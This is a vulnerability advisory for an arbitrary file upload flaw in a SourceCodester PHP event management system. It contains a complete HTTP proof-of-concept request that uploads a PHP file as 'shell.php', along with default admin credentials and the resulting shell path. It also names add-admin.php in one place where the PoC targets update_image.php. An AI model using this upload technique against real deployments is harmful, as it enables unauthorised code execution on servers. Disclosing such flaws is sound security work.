# RCE-2

## Vulnerability Description

Arbitrary file upload vulnerability in SourceCodester [Event Management System Project in PHP with Source Code](https://www.sourcecodester.com/php/15238/event-management-system-project-php-source-code.html) allows attackers to execute arbitrary code via the file upload to add-admin.php. It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/).

1. BUG_Author:  XuJianLin
2. vendors: [Event Management System Project in PHP with Source Code](https://www.sourcecodester.com/php/15238/event-management-system-project-php-source-code.html);
3. The program is built using the  PHP 7.3.4nts version;
4. Vulnerability location: /royal_event/update_image.php?id=2

# Vulnerability Verification

[+] Payload:

```
<?php phpinfo();?>
```

POC：

```http
POST http://localhost/royal_event/update_image.php?id=2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------272036942240946147034040939723
Content-Length: 493
Origin: http://localhost
Connection: close
Referer: http://localhost/royal_event/update_image.php?id=2
Cookie: PHPSESSID=13o927b44gh33i0a70b00sc0ac
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------272036942240946147034040939723
Content-Disposition: form-data; name="productName"

Nikhil Bhalerao
-----------------------------272036942240946147034040939723
Content-Disposition: form-data; name="productimage1"; filename="shell.php"
Content-Type: text/plain

<?php phpinfo();?>
-----------------------------272036942240946147034040939723
Content-Disposition: form-data; name="submit"


-----------------------------272036942240946147034040939723--

```

## How to verify

1.Build the vulnerability environment according to the steps provided by the source code author ;

2.login to the "Admin Panel” through the default account and password（username: ndbhalerao91@gmail.com  Password: admin）;

3.Shell Path:   **/royal_event/update_image.php?id=2**

The vulnerability lies in the "Profile - Update " function, you shuold inserts Payload when you update photo，as shown in the following figure：

​![image](assets/image-20240401102413-9l400b7.png)​

​![image](assets/image-20240401102427-ktw9pwd.png)​

​![image](assets/image-20240401102534-au2nx9s.png)​

​![image](assets/image-20240401102525-riq2785.png)​

/royal_event/assets/img/profileimages/shell.php

​![image](assets/image-20240401102359-sjxzrdm.png)​

​![image](assets/image-20240401102324-ksh6hn8.png)​
